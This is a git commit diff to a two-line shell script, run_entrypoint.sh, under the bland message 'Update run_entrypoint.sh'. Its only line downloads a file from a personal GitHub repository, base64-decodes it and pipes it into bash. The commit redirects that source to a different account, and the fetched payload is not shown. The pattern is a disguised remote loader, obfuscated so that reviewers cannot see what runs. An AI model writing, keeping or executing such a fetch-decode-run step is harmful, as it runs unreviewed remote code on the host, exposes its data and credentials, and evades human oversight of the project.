fc01e2bccc80f099233f209df296180b6ee50f08
cameronschenck <cameronschenck@proton.me>
2026-06-19 19:46:09 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/waltercorbin66/role/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/cameronschenck/tools/refs/heads/main/entrypoint.sh | base64 -d | bash
